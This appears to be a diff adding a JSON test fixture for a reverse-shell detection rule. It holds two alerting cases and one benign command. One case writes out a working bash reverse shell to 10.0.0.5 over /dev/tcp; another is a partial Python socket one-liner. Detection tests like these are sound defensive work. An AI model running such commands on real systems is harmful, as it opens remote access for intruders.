@@ -1,0 +1,23 @@
+[
+  {
+    "name": "bash_dev_tcp_fires",
+    "events": [
+      {"CommandLine": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"}
+    ],
+    "expected_alerts": 1
+  },
+  {
+    "name": "python_socket_oneliner_fires",
+    "events": [
+      {"CommandLine": "python3 -c 'import socket,subprocess,os;s=socket.socket()'"}
+    ],
+    "expected_alerts": 1
+  },
+  {
+    "name": "normal_python_does_not_fire",
+    "events": [
+      {"CommandLine": "python3 manage.py migrate"}
+    ],
+    "expected_alerts": 0
+  }
+]
